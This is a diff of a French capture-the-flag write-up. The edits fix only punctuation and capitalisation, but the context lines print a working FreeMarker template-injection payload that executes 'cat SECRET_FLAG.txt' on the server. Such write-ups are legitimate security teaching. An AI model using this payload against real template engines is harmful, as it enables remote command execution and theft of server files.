@@ -96,7 +96,7 @@ Ici, je vais maintenant lister les fichiers :
 
 Bingo! 
 
-Maintenant il suffit de faire : 
+Maintenant, il suffit de faire : 
 
 ```java
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("cat SECRET_FLAG.txt")}
@@ -105,4 +105,4 @@ Maintenant il suffit de faire :
 
 ![](../img/Pasted%20image%2020261015203550.png)
 
-BINGO ! on se retrouve bientôt pour un nouveau challenge ! 
+BINGO ! On se retrouve bientôt pour un nouveau challenge ! 
